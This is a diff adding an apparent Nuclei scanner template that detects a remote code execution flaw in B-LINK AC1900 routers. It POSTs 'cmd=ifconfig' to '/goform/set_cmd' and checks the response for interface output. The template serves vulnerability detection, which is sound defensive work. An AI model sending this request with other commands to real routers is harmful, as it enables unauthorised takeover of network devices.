@@ -1,0 +1,31 @@
+id: poc-b-link-ac1900-set-cmd-rce
+info:
+  name: B-LINK AC1900 set_cmd Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, ac1900
+http:
+  - method: POST
+    path:
+      - "/goform/set_cmd"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      cmd=ifconfig
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"type":"setcmd"'
+          - "cmdinfo"
+          - "Link encap"
+          - "HWaddr"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
